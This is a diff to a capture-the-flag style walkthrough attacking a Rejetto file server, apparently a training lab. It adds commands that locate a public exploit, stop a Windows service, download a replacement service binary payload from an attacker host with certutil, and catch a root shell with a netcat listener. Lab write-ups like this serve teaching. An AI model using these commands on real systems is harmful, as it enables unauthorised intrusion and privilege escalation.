@@ -62,7 +62,7 @@ We will begin by searching for an exploit in the exploitdb:
 `searchploit rejetto`
 ![](https://github.com/user-attachments/assets/c78ac923-a65a-4b91-a7d7-acaff97ef817)
 
-We will use the 39161.py one. Let's download it:
+We will use the 39161.py one. Let's download it: `searchsploit -p windows/remote/39161.py`
 ![](https://github.com/user-attachments/assets/f95e68c9-9f97-4865-b832-184ec411b25c)
 
 In the exploit we only need to change the IP and the LPORT to make it work.
@@ -85,9 +85,10 @@ Now it's time to fire it up:
 
 And as predicted, winpeas found our ASC privesc vuln.
 
-Now we will use certutil again to download and substitute the original ASCService.exe with our payload, after we have stopped the service:
+Now we will use `certutil` again to download and substitute the original ASCService.exe with our payload, after we have stopped the service: `sc stop AdvancedSystemCareService9`
 ![](https://github.com/user-attachments/assets/1fd7e1ac-05a2-4f1d-ad3a-4db7a64d9a0d)
 
+`certutil -f -split -urlcache http://<IP>:<PORT>/ASCService.exe ASCService.exe`
 ![](https://github.com/user-attachments/assets/cc6d0c75-c85d-41ee-be42-c521a5e6e027)
 
 In another terminal, fire up `nc -lvnp <PORT>` and finally, by restarting the service we will own our root shell. 
